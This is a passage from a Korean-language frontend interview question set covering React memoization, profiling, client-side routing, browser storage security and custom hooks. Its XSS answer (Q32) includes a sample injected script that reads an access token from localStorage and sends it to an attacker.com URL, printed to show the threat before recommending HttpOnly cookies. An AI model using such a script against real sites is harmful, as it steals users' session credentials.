단, 커스텀 비교 함수를 잘못 작성하면 실제 변경을 놓쳐 stale UI가 발생할 수 있으므로 신중하게 사용해야 합니다.

</details>

### Q22. `useMemo`와 `useCallback`의 차이점을 설명해 주세요. 또한, 모든 함수와 객체에 이 훅들을 무분별하게 적용하면 오히려 애플리케이션 성능이 떨어질 수 있다고 하는데 그 이유는 무엇인가요?

* 의도: 값을 캐싱하는 것과 함수 선언을 캐싱하는 것의 차이를 명확히 구분하고, 메모이제이션 비용(캐싱, 의존성 비교)이라는 '트레이드오프'를 인지하고 있는지 평가
* 키워드: `값 캐싱(Value Memoization)` `함수 참조 캐싱` `가비지 컬렉션(GC)` `의존성 배열 평가 비용` `트레이드오프`

<details>
<summary>답변</summary>

- **useMemo**: 계산된 **값**을 메모이제이션합니다. 의존성이 변경되지 않으면 이전에 계산한 값을 재사용합니다.
```javascript
const sortedList = useMemo(() => items.sort(compareFn), [items]);
```

- **useCallback**: **함수 선언 자체(참조)**를 메모이제이션합니다. 의존성이 변경되지 않으면 동일한 함수 객체를 반환합니다.
```javascript
const handleClick = useCallback(() => onClick(id), [id, onClick]);
```

`useCallback(fn, deps)`는 `useMemo(() => fn, deps)`와 동일하게 동작합니다.

**무분별한 적용의 부작용**:

1. **메모이제이션 자체의 비용**: 매 렌더링마다 이전/현재 의존성 배열을 `Object.is`로 비교하는 연산이 발생합니다.
2. **메모리 점유**: 캐시된 값/함수를 메모리에 계속 보유하여 GC가 수거하지 못합니다.
3. **코드 복잡도 증가**: 단순한 연산에 `useMemo`를 쓰면 가독성만 저하됩니다.

결론적으로 **메모이제이션 비용 < 리렌더링 비용**인 경우에만 적용해야 합니다. 실제 성능 병목을 측정하지 않고 예방 차원으로 남발하는 것은 오히려 역효과입니다.

</details>

### Q23. 복잡한 연산이 아닌 단순한 원시 타입(Primitive Type) 계산이나 가벼운 객체 생성에도 `useMemo`를 사용하는 것이 좋을까요?

* 의도: 최적화의 '손익 분기점'을 이해하고 있는지, 무의미한 오버엔지니어링을 피할 수 있는지 확인
* 키워드: `초기 할당 비용` `연산 복잡도` `가독성 저하` `불필요한 메모리 점유`

<details>
<summary>답변</summary>

**좋지 않습니다.** 단순한 연산에 `useMemo`를 적용하면 이점보다 비용이 더 큽니다.

`useMemo`를 사용하면 매 렌더링마다:
1. 의존성 배열의 각 값을 이전과 비교하는 연산이 발생합니다.
2. 이전 결과값을 메모리에 보유합니다.
3. 코드 가독성이 저하됩니다.

단순한 덧셈(`a + b`), 문자열 연결, 작은 배열 필터링 등은 실행 비용이 매우 낮아 `useMemo`의 오버헤드가 오히려 더 클 수 있습니다.

**useMemo가 실제로 유효한 경우**:
- 대용량 배열 정렬/필터/변환
- 복잡한 계산 (피보나치, 데이터 집계 등)
- 하위 컴포넌트에 props로 전달되는 객체/배열 (`React.memo`와 연계)

React 공식 문서도 `useMemo`는 실제로 성능 문제가 발생했을 때, Profiler로 확인 후 적용하라고 권장합니다.

</details>

### Q24. `useCallback`의 의존성 배열에 계속 변하는 상태(State)를 넣어야만 하는 상황에서, 함수가 계속 재생성되는 것을 막기 위한 우회 기법이 있을까요?

* 의도: 함수형 업데이트(`prev => prev + 1`)나 `useRef`를 활용해 의존성 배열을 비우면서도 최신 상태를 참조하는 고급 패턴 이해도 확인
* 키워드: `함수형 업데이트 적용` `useRef 활용` `의존성 제거` `최신 상태 보장`

<details>
<summary>답변</summary>

**방법 1 - 함수형 업데이트로 의존성 제거**:
setState 내부에서 현재 상태를 읽는 대신, 함수형 업데이트로 이전 상태를 주입받으면 `count`를 의존성에 넣지 않아도 됩니다.

```javascript
// 변경 전: count가 의존성에 있어 count 변경 시 함수 재생성
const increment = useCallback(() => setCount(count + 1), [count]);

// 변경 후: 의존성 없이 함수 안정화
const increment = useCallback(() => setCount(prev => prev + 1), []);
```

**방법 2 - useRef로 최신 상태 참조**:
상태 값을 ref에 동기화해두고, 콜백에서 `ref.current`를 읽으면 의존성 없이 항상 최신 값에 접근할 수 있습니다. (`useEffectEvent` 훅의 등장 배경이기도 합니다.)

```javascript
const countRef = useRef(count);
useEffect(() => { countRef.current = count; }, [count]);

const logCount = useCallback(() => {
  console.log(countRef.current); // 항상 최신 count
}, []); // 빈 의존성 배열
```

단, ref를 직접 읽는 방식은 React 렌더링 모델 외부에서 동작하므로, 렌더링 결과에 영향을 주는 값에는 사용하지 않는 것이 원칙입니다.

</details>

### Q25. 렌더링 최적화를 위해 React 개발자 도구(Profiler)를 활용하여 애플리케이션의 렌더링 병목(Bottleneck)을 찾아보고 개선해 본 경험이 있나요? (없다면 성능 문제 발생 시 어떤 프로세스로 접근할 것인지 설명해 주세요.)

* 의도: 이론적인 최적화를 넘어, 실제 도구를 활용해 문제를 정량적으로 측정하고 원인을 분석하는 실무적인 트러블슈팅 역량 검증
* 키워드: `Flamegraph(플레임그래프)` `렌더링 시간 측정` `"Why did this render?"` `정량적 접근`

<details>
<summary>답변</summary>

React DevTools의 Profiler를 활용한 성능 최적화 접근 프로세스:

**1단계 - 문제 정의**: 막연한 "느리다"가 아니라 어떤 인터랙션에서, 몇 ms 이상일 때 문제인지 기준을 설정합니다.

**2단계 - Profiler로 측정**:
- React DevTools > Profiler 탭에서 Record 후 문제가 되는 인터랙션을 수행합니다.
- **Flamegraph**: 각 컴포넌트의 렌더링 시간과 빈도를 시각화합니다. 넓고 밝은 바가 병목입니다.
- **"Why did this render?"**: 컴포넌트가 왜 리렌더링됐는지 props/state/context 변경 원인을 표시해줍니다.

**3단계 - 원인 분석 및 수정**:
- 불필요하게 자주 리렌더링되는 컴포넌트를 `React.memo`로 감쌉니다.
- 참조 타입 props를 `useMemo`/`useCallback`으로 안정화합니다.
- Context를 분할하거나 Zustand Selector로 구독 범위를 좁힙니다.

**4단계 - 재측정**: 변경 후 동일 시나리오를 다시 Profiler로 측정하여 수치로 개선을 확인합니다. 측정 없는 최적화는 오버엔지니어링의 원인이 됩니다.

</details>

### Q26. Profiler에서 확인해 보니 특정 컴포넌트 내부에서 너무 많은 UI를 한 번에 그리고 있어서 렌더링이 오래 걸렸습니다. 이를 어떻게 리팩토링하시겠습니까?

* 의도: 무조건적인 `memo` 사용이 아닌, '컴포넌트 분할'과 '상태 위치 조정'이라는 근본적인 구조 개선 능력을 평가
* 키워드: `컴포넌트 분할(Component Splitting)` `상태 끌어내리기(Push State Down)` `관심사 분리`

<details>
<summary>답변</summary>

단순히 `React.memo`를 덮어씌우는 것은 근본적인 해결책이 아닙니다. 두 가지 구조적 접근이 효과적입니다.

**1. 컴포넌트 분할(Component Splitting)**:
하나의 대형 컴포넌트를 역할 단위로 쪼개면, 특정 상태 변경이 관련 없는 하위 컴포넌트를 리렌더링하지 않도록 격리할 수 있습니다.

```javascript
// Before: 모든 UI가 하나의 컴포넌트 (count 변경 시 전체 리렌더링)
function Dashboard() {
  const [count, setCount] = useState(0);
  return (
    <>
      <Counter count={count} />
      <HeavyChart />  {/* count와 무관한데 함께 리렌더링 */}
    </>
  );
}

// After: Counter 상태를 분리 → HeavyChart 리렌더링 방지
function CounterSection() {
  const [count, setCount] = useState(0);
  return <Counter count={count} />;
}
function Dashboard() {
  return (
    <>
      <CounterSection />
      <HeavyChart />
    </>
  );
}
```

**2. 상태 끌어내리기(Push State Down)**:
상태를 실제로 사용하는 컴포넌트 가장 가까운 곳으로 내려, 상태 변경의 영향 범위를 최소화합니다.

이 두 방법은 `React.memo`나 `useMemo` 없이도 리렌더링 범위를 좁힐 수 있어, 가독성을 유지하면서 성능을 개선하는 가장 근본적인 방법입니다.

</details>

### Q27. 최적화를 진행할 때 '성능 최적화는 가장 나중에 해라(Premature optimization is the root of all evil)'라는 격언이 있습니다. 프로젝트에서 성능 최적화를 시작하는 본인만의 기준이나 트리거가 있나요?

* 의도: 개발 우선순위(빠른 기능 구현 vs 최적화)에 대한 주관과, 가독성과 성능 사이의 타협점을 묻는 철학적인 질문
* 키워드: `사용자 경험(UX) 저하 인지` `정량적 지표(Frame Drop 등)` `가독성 훼손 최소화`

<details>
<summary>답변</summary>

**기본 원칙**: 성능 문제가 실제로 존재하고 측정 가능할 때 최적화를 시작합니다. 측정 없는 예방적 최적화는 코드 복잡도를 높이고, 실제 병목과 무관한 곳을 최적화하는 낭비로 이어집니다.

**최적화를 시작하는 기준**:
1. **사용자 경험 저하가 체감될 때**: 인터랙션 후 100ms 이상 딜레이, 스크롤 프레임 드롭(60fps 미만), 입력 지연 등 사용자가 느낄 수 있는 수준
2. **정량적 지표 이상 감지**: Core Web Vitals(LCP, INP, CLS)가 기준치를 초과할 때
3. **Profiler로 병목이 확인됐을 때**: 감으로 최적화하는 것이 아니라 Profiler/DevTools로 실제 원인을 확인한 후

**우선순위**: 먼저 코드 구조(컴포넌트 분할, 상태 위치)로 해결하고, 그래도 부족할 때 `React.memo`, `useMemo`, `useCallback`을 선택적으로 도입합니다. 가독성 훼손 비용과 성능 개선 효과를 항상 비교합니다.

</details>

### Q28. React Router를 활용한 CSR(Client-Side Routing)의 동작 원리를 브라우저의 History API와 연관 지어 설명해 주세요. 전통적인 MPA(Multi-Page Application)의 라우팅 방식과 비교했을 때 어떤 차이가 있나요?

* 의도: SPA의 본질적인 특징(페이지 깜빡임 없음, 필요한 데이터만 로드)과 이를 가능하게 하는 브라우저 레벨의 API(`pushState`, `popstate`)를 이해하고 있는지 검증
* 키워드: `CSR` `History API` `pushState` `popstate 이벤트` `깜빡임(Refresh) 없음` `가상 라우팅`

<details>
<summary>답변</summary>

**MPA(전통적 방식)**: 링크 클릭 시 브라우저가 서버에 새 HTML 문서를 요청하고, 페이지 전체를 새로 로드합니다. URL이 바뀔 때마다 전체 새로고침이 발생합니다.

**CSR(React Router 방식)**:
브라우저의 `History API`를 활용합니다. `pushState`는 브라우저의 실제 HTTP 요청 없이 URL과 히스토리 스택만 변경합니다.

```javascript
// React Router 내부 동작 원리 (단순화)
function navigate(to) {
  window.history.pushState(null, '', to); // URL만 변경, 서버 요청 없음
  // React 상태 업데이트 → 매칭되는 Route 컴포넌트 렌더링
  setCurrentPath(to);
}
```

1. 사용자가 `<Link to="/about">`을 클릭하면 `pushState`로 URL을 변경
2. React Router가 변경된 URL을 감지하여 내부 상태를 업데이트
3. 현재 URL에 매칭되는 `<Route>` 컴포넌트를 렌더링

페이지 전환 시 HTML을 다시 받지 않고 컴포넌트만 교체하므로 **깜빡임 없이** 빠른 화면 전환이 가능합니다.

</details>

### Q29. 사용자가 브라우저의 '뒤로 가기' 버튼을 눌렀을 때, React Router는 어떻게 이를 감지하고 화면(UI)을 업데이트하나요?

* 의도: 브라우저 이벤트(`popstate`)와 React 상태/렌더링의 연결 고리를 이해하는지 확인
* 키워드: `popstate 이벤트 리스너` `URL 변경 감지` `상태 업데이트 및 리렌더링`

<details>
<summary>답변</summary>

브라우저의 뒤로 가기/앞으로 가기 버튼은 히스토리 스택을 탐색하면서 **`popstate` 이벤트**를 발생시킵니다. `pushState`로 직접 URL을 변경할 때는 이 이벤트가 발생하지 않지만, 브라우저 내비게이션 버튼으로 스택을 탐색할 때는 발생합니다.

React Router는 초기화 시 `popstate` 이벤트 리스너를 등록합니다:

```javascript
// React Router 내부 동작 원리 (단순화)
window.addEventListener('popstate', () => {
  // 현재 URL(window.location.pathname)을 읽어 내부 상태 업데이트
  setCurrentPath(window.location.pathname);
  // → 매칭되는 Route 컴포넌트가 리렌더링됨
});
```

정리하면:
1. 뒤로 가기 → 브라우저가 히스토리 스택에서 이전 URL 복원 + `popstate` 발생
2. React Router의 리스너가 `window.location.pathname`을 읽어 현재 경로를 파악
3. 내부 경로 상태를 업데이트 → 해당 URL에 매칭되는 컴포넌트를 리렌더링

</details>

### Q30. CSR 환경에서 초기 로딩 속도가 느려지거나 SEO(검색 엔진 최적화)가 취약하다는 단점이 있습니다. 이 문제를 어떻게 보완할 수 있을까요?

* 의도: SPA의 치명적인 단점을 인지하고, Next.js(SSR/SSG) 같은 대안이나 Code Splitting 등의 해결책을 알고 있는지 평가
* 키워드: `Code Splitting(코드 스플리팅)` `SSR(서버 사이드 렌더링)` `SSG` `Pre-rendering`

<details>
<summary>답변</summary>

**CSR의 단점**:
- **초기 로딩 느림(TTI)**: 대용량 JS 번들 전체를 다운로드하고 파싱한 후에야 화면이 그려집니다.
- **SEO 취약**: 검색 엔진 크롤러가 빈 HTML(`<div id="root">`)만 보고 JS 실행 후 채워지는 콘텐츠를 인덱싱하지 못할 수 있습니다.

**해결책**:

1. **Code Splitting + Lazy Loading**: `React.lazy`와 `Suspense`로 라우트 단위로 번들을 분리하여 초기 로드 크기를 줄입니다.
```javascript
const About = React.lazy(() => import('./About'));
```

2. **SSR(Server-Side Rendering)**: 서버에서 React를 실행하여 완성된 HTML을 클라이언트에 전달합니다. 크롤러도 완성된 HTML을 볼 수 있어 SEO가 개선됩니다. Next.js의 `getServerSideProps`가 대표적입니다.

3. **SSG(Static Site Generation)**: 빌드 시점에 HTML을 미리 생성합니다. 콘텐츠가 자주 바뀌지 않는 페이지에 적합합니다. Next.js의 `getStaticProps`가 대표적입니다.

SEO가 중요하고 초기 로딩 성능이 critical한 서비스라면 Next.js 같은 SSR/SSG 프레임워크 도입을 고려합니다.

</details>

### Q31. 로그인 토큰(JWT)이나 유저 설정 데이터를 클라이언트에 저장할 때, Local Storage와 Session Storage의 차이점은 무엇이며, 각각 어떤 보안적 취약점을 고려해야 하나요?

* 의도: 브라우저 스토리지의 생명주기를 정확히 알고, 민감한 데이터를 다룰 때 발생하는 보안 이슈(XSS, CSRF)에 대한 방어 지식이 있는지 평가
* 키워드: `생명주기(Lifecycle)` `탭/창 독립성(Session)` `영구 저장(Local)` `XSS(크로스 사이트 스크립팅)`

<details>
<summary>답변</summary>

| 구분 | Local Storage | Session Storage |
|---|---|---|
| 유지 기간 | 명시적으로 삭제하기 전까지 영구 | 탭/창이 닫히면 삭제 |
| 공유 범위 | 같은 출처의 모든 탭/창에서 공유 | 해당 탭/창 내에서만 독립적 |
| 용량 | 약 5~10MB | 약 5MB |

**공통 보안 취약점 - XSS(Cross-Site Scripting)**:
두 스토리지 모두 JavaScript로 접근 가능(`localStorage.getItem`)합니다. XSS 공격으로 악성 스크립트가 주입되면 토큰이 그대로 탈취됩니다.

**따라서 Access Token 저장에 LocalStorage/SessionStorage는 권장되지 않습니다**. 대신:
- `HttpOnly` 속성의 쿠키에 저장하면 JavaScript로 접근 자체가 불가능합니다.
- `Secure` 속성으로 HTTPS에서만 전송되도록 제한합니다.
- `SameSite` 속성으로 CSRF 공격을 방어합니다.

</details>

### Q32. 만약 해커가 악의적인 자바스크립트 코드(XSS)를 주입했다면, Local Storage에 저장된 Access Token은 어떻게 탈취될 수 있나요? 이를 막기 위한 더 안전한 대안은 무엇일까요?

* 의도: 실무적인 웹 보안 지식과 `HttpOnly` 쿠키 등의 안전한 인증 처리 방식 숙련도 검증
* 키워드: `localStorage.getItem` `XSS 취약점 노출` `HttpOnly Cookie` `Secure 속성`

<details>
<summary>답변</summary>

**탈취 과정**:
XSS 취약점(예: 사용자 입력을 `innerHTML`로 직접 렌더링)을 통해 악성 스크립트가 실행되면:

```javascript
// 공격자가 주입한 스크립트
const token = localStorage.getItem('access_token');
fetch('https://attacker.com/steal?token=' + token);
// Access Token이 외부로 전송됨
```

LocalStorage는 같은 출처의 JavaScript라면 제한 없이 접근할 수 있으므로, 스크립트 주입만 성공하면 토큰 탈취가 바로 가능합니다.

**안전한 대안 - HttpOnly Cookie**:
- `HttpOnly` 속성이 설정된 쿠키는 **JavaScript에서 접근 자체가 차단**됩니다. `document.cookie`로도 읽을 수 없습니다.
- 서버가 응답 헤더에 `Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict`를 설정합니다.
- 브라우저가 요청 시 자동으로 쿠키를 포함시키므로 클라이언트 코드에서 토큰을 직접 다룰 필요가 없습니다.

단, HttpOnly 쿠키는 CSRF 공격에 취약하므로 `SameSite` 설정이나 CSRF 토큰으로 추가 방어가 필요합니다.

</details>

### Q33. '다크 모드' 설정이나 '오늘 하루 보지 않기' 팝업 상태는 각각 어떤 스토리지에 저장하는 것이 적절하며, 그 이유는 무엇인가요?

* 의도: 데이터의 성격(유지 기간, 세션 의존성)에 따라 적절한 저장소를 선택하는 실무 판단력 확인
* 키워드: `Local Storage(영구적 설정 유지)` `Cookie(만료일 설정 가능)` `사용자 경험(UX)`

<details>
<summary>답변</summary>

**다크 모드 설정 → Local Storage**:
사용자가 다음에 방문할 때도, 다른 탭에서 열어도 설정이 유지되어야 합니다. 브라우저를 닫아도 사라지지 않는 **영구 저장**이 필요하므로 Local Storage가 적합합니다.

```javascript
localStorage.setItem('theme', 'dark');
```

**'오늘 하루 보지 않기' 팝업 → Cookie (만료일 지정)**:
"오늘 하루"라는 **정확한 만료 시점**이 있습니다. Local Storage는 만료 기능이 없으므로 만료일(`expires` 또는 `max-age`)을 지정할 수 있는 쿠키가 적합합니다.

```javascript
// 자정까지 유효한 쿠키 설정
document.cookie = 'hide_popup=true; expires=' + endOfDay.toUTCString();
```

만약 Session Storage를 사용하면 탭을 닫고 다시 열었을 때 다시 팝업이 뜨게 됩니다. 데이터의 **유지 기간과 범위**에 맞는 스토리지를 선택하는 것이 핵심입니다.

</details>

### Q34. 프로젝트에서 공통 컴포넌트(UI)와 비즈니스 로직을 분리하여 재사용성을 높인 경험에 대해 설명해 주세요. 특히 Custom Hooks를 활용해 어떤 로직을 분리해 보았나요?

* 의도: 프론트엔드 아키텍처(관심사 분리) 역량과 훅(Hook)을 통한 로직의 추상화/재사용 경험 평가
* 키워드: `관심사 분리(SoC)` `Custom Hook` `재사용성` `View와 Logic의 분리` `추상화`

<details>
<summary>답변</summary>

Custom Hook은 컴포넌트의 **UI 관심사와 비즈니스 로직 관심사를 분리**하는 핵심 수단입니다.

**분리 원칙**: 컴포넌트는 "무엇을 보여줄지"에 집중하고, Custom Hook은 "어떻게 데이터를 가져오고 관리할지"를 담당합니다.

**대표적인 추출 패턴**:

1. **API 호출 로직 추상화** (`useFetch`, `useQuery`):
```javascript
function useUserList() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(false);
  useEffect(() => {
    setLoading(true);
    fetchUsers().then(setUsers).finally(() => setLoading(false));
  }, []);
  return { users, loading };
}
// 컴포넌트: const { users, loading } = useUserList();
```

2. **폼 상태 관리** (`useForm`): 입력값, 유효성 검사, submit 핸들러를 한 곳에서 관리

3. **브라우저 API 래핑** (`useLocalStorage`, `useMediaQuery`): Web API를 React 상태와 연동

Custom Hook으로 분리하면 같은 로직을 여러 컴포넌트에서 재사용할 수 있고, 컴포넌트 코드가 간결해져 테스트와 유지보수가 쉬워집니다.

</details>

### Q35. Custom Hook 내부에서 `useState`나 `useEffect`를 사용했을 때, 이 Hook을 여러 컴포넌트에서 호출하면 그 안의 상태(State)가 서로 공유되나요, 아니면 독립적으로 동작하나요?

* 의도: Hook의 본질(상태 로직의 재사용이지, 상태 값 자체의 공유가 아님)을 정확히 이해하고 있는지 검증
* 키워드: `상태 독립성` `로직의 재사용` `인스턴스화`

<details>
<summary>답변</summary>

**독립적으로 동작합니다.** Custom Hook은 상태 값이 아닌 **상태 로직(패턴)**을 재사용하는 메커니즘입니다.

컴포넌트가 Custom Hook을 호출할 때마다, React는 해당 컴포넌트의 Fiber 노드에 별도의 상태 슬롯을 생성합니다. 마치 클래스의 인스턴스처럼, 각 호출은 완전히 독립적인 상태를 가집니다.

```javascript
function useCounter() {
  const [count, setCount] = useState(0);
  return { count, increment: () => setCount(c => c + 1) };
}

function ComponentA() {
  const { count } = useCounter(); // 독립적인 count
}
function ComponentB() {
  const { count } = useCounter(); // ComponentA의 count와 무관한 독립적인 count
}
```

`ComponentA`에서 `increment`를 호출해도 `ComponentB`의 `count`는 변하지 않습니다.

만약 여러 컴포넌트가 **상태를 공유**해야 한다면 Custom Hook이 아니라 Context API, Zustand 같은 전역 상태 관리를 사용해야 합니다.

</details>

### Q36. 특정 도메인 로직(예: 타이머 로직, 오디오 녹음 로직, 폼 검증 로직 등)을 Custom Hook(예: `useTimer`)으로 뺄 때, 인자(Arguments)와 반환값(Return value)의 인터페이스를 어떻게 설계하셨나요?

* 의도: Custom Hook을 단순한 로직 분리 수준을 넘어, 재사용 가능한 API로 설계하는 능력을 평가
* 키워드: `명세(Contract) 설계` `제어 역전(IoC)` `최소한의 인터페이스` `옵션 객체 패턴`

<details>
<summary>답변</summary>

Custom Hook의 인터페이스 설계는 일반 함수 API 설계와 동일한 원칙을 따릅니다.

**인자(Arguments) 설계 원칙**:
- 단순한 경우 개별 인자로, 옵션이 많거나 선택적인 경우 **옵션 객체 패턴**을 사용합니다.
- 동작을 외부에서 제어하려면 **콜백 함수를 인자로 받아 제어를 역전(IoC)**합니다.

```javascript
function useTimer({ initialTime = 0, onExpire, autoStart = false } = {}) {
  const [time, setTime] = useState(initialTime);
  const [isRunning, setIsRunning] = useState(autoStart);

  useEffect(() => {
    if (!isRunning) return;
    if (time <= 0) { onExpire?.(); return; }
    const id = setTimeout(() => setTime(t => t - 1), 1000);
    return () => clearTimeout(id);
  }, [isRunning, time, onExpire]);

  return {
    time,
    isRunning,
    start: () => setIsRunning(true),
    stop: () => setIsRunning(false),
    reset: () => setTime(initialTime),
  };
}
```

**반환값 설계 원칙**:
- **객체 반환**: 반환값이 여러 개이고 호출 측에서 필요한 것만 구조 분해할 때 (이름 기반 접근, 순서 무관)
- **배열 반환**: `useState`처럼 2개 이하이고 이름을 커스텀하게 짓고 싶을 때

외부에서 상태를 직접 조작하지 않고 `start`, `stop`, `reset` 같은 **행위 단위 메서드**만 노출하는 것이 캡슐화 측면에서 좋습니다.

</details>

### Q37. `shallowEqual`이란 무엇이며, React 생태계에서 어떤 상황에 활용되나요? `Object.is` 기반의 기본 비교와 어떤 차이가 있나요?

* 의도: React의 렌더링 최적화 전반에 걸쳐 사용되는 얕은 동등 비교의 원리를 이해하고, 기본 참조 비교와의 차이 및 적절한 활용 상황을 아는지 평가
* 키워드: `1단계 프로퍼티 비교` `Object.is` `React.memo 기본 비교` `useSelector(react-redux)` `deep equal과의 차이`

<details>
<summary>답변</summary>

**shallowEqual이란**:
두 객체의 **1단계(top-level) 프로퍼티들을 `Object.is`로 하나씩 비교**하는 함수입니다. 중첩 객체의 내부까지 재귀 비교하는 deep equal과 달리, 최상위 키-값 쌍만 확인합니다.

```javascript
// shallowEqual 구현 원리
function shallowEqual(objA, objB) {
  if (Object.is(objA, objB)) return true;
  if (typeof objA !== 'object' || typeof objB !== 'object') return false;

  const keysA = Object.keys(objA);
  const keysB = Object.keys(objB);

  if (keysA.length !== keysB.length) return false;

  return keysA.every(key => Object.is(objA[key], objB[key]));
}
```

**`Object.is`(기본 참조 비교)와의 차이**:

| 비교 방식 | 동작 | 결과 |
|---|---|---|
| `Object.is(a, b)` | 참조 주소가 같은지만 확인 | `{ x: 1 } === { x: 1 }` → `false` |
| `shallowEqual(a, b)` | 1단계 프로퍼티를 순회하며 비교 | `{ x: 1 }` vs `{ x: 1 }` → `true` |

**React 생태계에서의 활용**:

1. **`React.memo` 기본 비교**: `React.memo`가 props를 비교할 때 내부적으로 각 prop에 대해 `Object.is`를 수행하는데, 이 동작이 실질적으로 shallowEqual과 동일합니다. props 최상위 값들이 같으면 리렌더링을 건너뜁니다.

2. **`useSelector` (react-redux)**: 두 번째 인자로 `shallowEqual`을 넘기면, selector가 객체를 반환할 때 참조가 바뀌어도 내용이 같으면 리렌더링을 방지합니다.
```javascript
import { shallowEqual, useSelector } from 'react-redux';

// 참조가 매번 새로 생성돼도 내용이 같으면 리렌더링 안 함
const { name, age } = useSelector(
  state => ({ name: state.user.name, age: state.user.age }),
  shallowEqual
);
```

3. **`React.memo` 커스텀 비교 함수**: Q21처럼 두 번째 인자로 shallowEqual을 직접 넘겨 1단계 비교를 명시적으로 적용할 수 있습니다.

**한계 - 중첩 객체**:
```javascript
shallowEqual(
  { user: { name: 'Alice' } },
  { user: { name: 'Alice' } }
); // false → user 프로퍼티의 참조가 달라서
```
중첩 객체는 1단계에서 참조를 비교하므로 내용이 같아도 `false`를 반환합니다. 이 경우 deep equal이 필요하지만, 비용이 크므로 구조를 평탄화하거나 `useMemo`로 참조를 안정화하는 것이 일반적입니다.

</details>
